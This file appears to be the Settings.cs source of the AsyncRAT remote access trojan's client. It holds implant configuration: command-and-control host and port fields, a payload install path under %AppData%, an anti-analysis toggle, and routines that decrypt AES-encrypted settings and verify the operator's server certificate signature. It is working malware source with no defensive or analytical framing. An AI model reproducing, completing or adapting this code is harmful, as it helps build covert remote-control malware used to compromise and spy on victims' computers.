using Client.Cryptography;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Client
{
    public static class Settings
    {
#if DEBUG
        public static string Ports = "6606";
        public static string Hosts = "127.0.0.1";
        public static string Version = "AsyncRAT 0.4.7";
        public static string Install = "false";
        public static string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%AppData%"), "Payload.exe");
        public static string Key = "NYAN CAT";
        public static string MTX = "%MTX%";
        public static string Certificate = "%Certificate%";
        public static string Serversignature = "%Serversignature%";
        public static X509Certificate2 ServerCertificate;
        public static string Anti = "false";
        public static Aes256 aes256 = new Aes256(Key);
#else
        public static string Ports = "%Ports%";
        public static string Hosts = "%Hosts%";
        public static string Version = "AsyncRAT 0.4.8B";
        public static string Install = "%Install%";
        public static string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%Folder%"), "%File%");
        public static string Key = "%Key%";
        public static string MTX = "%MTX%";
        public static string Certificate = "%Certificate%";
        public static string Serversignature = "%Serversignature%";
        public static X509Certificate2 ServerCertificate;
        public static readonly string Anti = "%Anti%";
        public static Aes256 aes256;
#endif


        public static bool InitializeSettings()
        {
#if DEBUG
            return true;
#endif
            try
            {
                Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
                aes256 = new Aes256(Key);
                Ports = aes256.Decrypt(Ports);
                Hosts = aes256.Decrypt(Hosts);
                Serversignature = aes256.Decrypt(Serversignature);
                ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
                return VerifyHash();
            }
            catch { return false; }
        }

        private static bool VerifyHash()
        {
            try
            {
                var csp = (RSACryptoServiceProvider)ServerCertificate.PublicKey.Key;
                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}